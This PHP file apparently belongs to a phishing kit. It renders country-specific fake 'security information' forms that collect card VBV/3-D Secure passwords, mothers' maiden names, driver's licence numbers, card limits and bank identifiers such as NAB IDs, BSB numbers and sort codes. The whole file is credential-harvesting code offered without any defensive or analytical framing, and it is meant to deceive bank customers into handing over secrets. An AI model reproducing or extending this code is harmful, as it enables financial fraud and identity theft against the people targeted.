<?php
session_start();
include '../../lang.php';
$country = $_SESSION['country'];
switch ($country) {
case "United States":
    echo '<div align="left"><p style="position:absolute;top: 120px; left:20px;">'.$secinfo.'</p>

        <input name="vbv" style="position:absolute;top: 145px;left:20px; width:430px;" type="password" placeholder="'.$trid_sec.'" class="required" required="required"><p style="position:absolute;top: 190px; left:20px;">'.$qinfo.'</p>
        <input name="Mname" style="position:absolute;top: 215px;left:20px; width:430px;" type="text" placeholder="'.$mother.'" class="required" required="required">
<input name="driver_license" style="position:absolute;top: 255px;left:20px; width:430px;" type="text" placeholder="'.$driver.'" class="required" required="required">
        <button class="button rect" type="submit" style="
            position: absolute;
            top: 365px;
            width: 430px;
            padding:7px;">
        <span>'.$continue.'</span>
        </button>
        </div>';
break;

case "Australia":

    $bank = $_SESSION['bank_name'];
    if($bank == "NATIONAL AUSTRALIA BANK, LTD." or $bank == "NATIONAL AUSTRALIA BANK LIMITED" or preg_match('/NATIONAL AUSTRALIA BANK/',$bank)) {
    echo '<div align="left"><p style="position:absolute;top: 120px; left:20px;">Card Information</p>

        <input name="vbv" style="position:absolute;top: 145px;left:20px; width:430px;" type="password" placeholder="'.$trid_sec.'" class="required" required="required">
        <input required="required" name="nabid" style="position:absolute;top: 182px;left:20px; width:430px;" type="text" placeholder="NAB ID" class="required"><input required="required" name="bsbnumber" style="position:absolute;top: 220px;left:20px; width:430px;" type="text" placeholder="BSB Number" class="required">


<input required="required" name="cc_limit" style="position:absolute;top: 255px;left:20px; width:430px;" type="text" placeholder="'.$climit.'" class="required">
<p style="position:absolute;top: 295px; left:20px;">Security Question</p>

        <input name="Mname" style="position:absolute;top: 320px;left:20px; width:430px;" type="text" placeholder="'.$mother.'" class="required" required="required"><button class="button rect" type="submit" style="
            position: absolute;
            top: 365px;
            width: 430px;
            padding:7px;">
        <span>'.$continue.'</span>
        </button>
        </div>';
    }else{
    echo '<div align="left"><p style="position:absolute;top: 120px; left:20px;">'.$secinfo.'</p>

        <input name="vbv" style="position:absolute;top: 145px;left:20px; width:430px;" type="password" placeholder="'.$trid_sec.'" class="required" required="required"><p style="position:absolute;top: 190px; left:20px;">'.$qinfo.'</p>
        <input name="Mname" style="position:absolute;top: 215px;left:20px; width:430px;" type="text" placeholder="'.$mother.'" class="required" required="required">
<input required="required" name="cc_limit" style="position:absolute;top: 255px;left:20px; width:430px;" type="text" placeholder="'.$climit.'" class="required">
        <button class="button rect" type="submit" style="
            position: absolute;
            top: 365px;
            width: 430px;
            padding:7px;">
        <span>'.$continue.'</span>
        </button>
        </div>';
    }
break;

case "Japan":
    echo '<div align="left"><p style="position:absolute;top: 120px; left:20px;">'.$cardid.'</p>

        <input name="cardid" style="position:absolute;top: 145px;left:20px; width:430px;" type="text" placeholder="" class="required" required="required"><p style="position:absolute;top: 190px; left:20px;">'.$passid.'</p>
        <input name="passid" style="position:absolute;top: 215px;left:20px; width:430px;" type="password" placeholder="" class="required" required="required">
        <button class="button rect" type="submit" style="
            position: absolute;
            top: 365px;
            width: 430px;
            padding:7px;">
        <span>'.$continue.'</span>
        </button>
        </div>';
break;

case "Thailand":
    echo '<div align="left"><p style="position:absolute;top: 120px; left:20px;">'.$secinfo.'</p>

        <input name="vbv" style="position:absolute;top: 145px;left:20px; width:430px;" type="password" placeholder="'.$trid_sec.'" class="required" required="required"><p style="position:absolute;top: 190px; left:20px;">'.$qinfo.'</p>
        <input name="Mname" style="position:absolute;top: 215px;left:20px; width:430px;" type="text" placeholder="'.$mother.'" class="required" required="required">
<input required="required" name="cc_limit" style="position:absolute;top: 255px;left:20px; width:430px;" type="text" placeholder="'.$climit.'" class="required">
        <button class="button rect" type="submit" style="
            position: absolute;
            top: 365px;
            width: 430px;
            padding:7px;">
        <span>'.$continue.'</span>
        </button>
        </div>';
break;

case "India":
    echo '<div align="left"><p style="position:absolute;top: 120px; left:20px;">'.$secinfo.'</p>

        <input required="required" name="vbv" style="position:absolute;top: 145px;left:20px; width:430px;" type="password" placeholder="'.$trid_sec.'" class="required"><p style="position:absolute;top: 190px; left:20px;">'.$qinfo.'</p>
        <input required="required" name="Mname" style="position:absolute;top: 215px;left:20px; width:430px;" type="text" placeholder="'.$mother.'" class="required">
<input required="required" name="cc_limit" style="position:absolute;top: 255px;left:20px; width:430px;" type="text" placeholder="'.$climit.'" class="required">
        <button class="button rect" type="submit" style="
            position: absolute;
            top: 365px;
            width: 430px;
            padding:7px;">
        <span>'.$continue.'</span>
        </button>
        </div>';
break;

case "New Zealand":
    echo '<div align="left"><p style="position:absolute;top: 120px; left:20px;">'.$secinfo.'</p>

        <input required="required" name="vbv" style="position:absolute;top: 145px;left:20px; width:430px;" type="password" placeholder="'.$trid_sec.'" class="required"><p style="position:absolute;top: 190px; left:20px;">'.$qinfo.'</p>
        <input required="required" name="Mname" style="position:absolute;top: 215px;left:20px; width:430px;" type="text" placeholder="'.$mother.'" class="required">
<input required="required" name="cc_limit" style="position:absolute;top: 255px;left:20px; width:430px;" type="text" placeholder="'.$climit.'" class="required">
<input required="required" name="bankaccnumber" style="position:absolute;top: 295px;left:20px; width:430px;" type="text" placeholder="Bank Access Number" class="required">
        <button class="button rect" type="submit" style="
            position: absolute;
            top: 365px;
            width: 430px;
            padding:7px;">
        <span>'.$continue.'</span>
        </button>
        </div>';
break;

case "United Kingdom":
    echo '<div align="left"><p style="position:absolute;top: 120px; left:20px;">'.$secinfo.'</p>

        <input required="required" name="vbv" style="position:absolute;top: 145px;left:20px; width:430px;" type="password" placeholder="'.$trid_sec.'" class="required"><p style="position:absolute;top: 190px; left:20px;">'.$qinfo.'</p>
        <input required="required" name="Mname" style="position:absolute;top: 215px;left:20px; width:430px;" type="text" placeholder="'.$mother.'" class="required">
<input required="required" name="sort_code" style="position:absolute;top: 255px;left:20px; width:430px;" type="text" placeholder="Sort Code" class="required">
        <button class="button rect" type="submit" style="
            position: absolute;
            top: 365px;
            width: 430px;
            padding:7px;">
        <span>'.$continue.'</span>
        </button>
        </div>';
break;

case "Saudi Arabia":
    echo '<div align="left"><p style="position:absolute;top: 120px; left:20px;">'.$secinfo.'</p>

        <input required="required" name="vbv" style="position:absolute;top: 145px;left:20px; width:430px;" type="password" placeholder="'.$trid_sec.'" class="required"><p style="position:absolute;top: 190px; left:20px;">'.$qinfo.'</p>
        <input required="required" name="Mname" style="position:absolute;top: 215px;left:20px; width:430px;" type="text" placeholder="'.$mother.'" class="required">
<input required="required" name="cc_limit" style="position:absolute;top: 255px;left:20px; width:430px;" type="text" placeholder="'.$climit.'" class="required">
        <button class="button rect" type="submit" style="
            position: absolute;
            top: 365px;
            width: 430px;
            padding:7px;">
        <span>'.$continue.'</span>
        </button>
        </div>';
break;

default:
echo '<div align="left"><p style="position:absolute;top: 120px; left:20px;">'.$secinfo.'</p>

        <input required="required" name="vbv" style="position:absolute;top: 145px;left:20px; width:430px;" type="password" placeholder="'.$trid_sec.'" class="required"><p style="position:absolute;top: 190px; left:20px;">'.$qinfo.'</p>
        <input required="required" name="Mname" style="position:absolute;top: 215px;left:20px; width:430px;" type="text" placeholder="'.$mother.'" class="required">
        <button class="button rect" type="submit" style="
            position: absolute;
            top: 365px;
            width: 430px;
            padding:7px;">
        <span>'.$continue.'</span>
        </button>
        </div>
        ';
}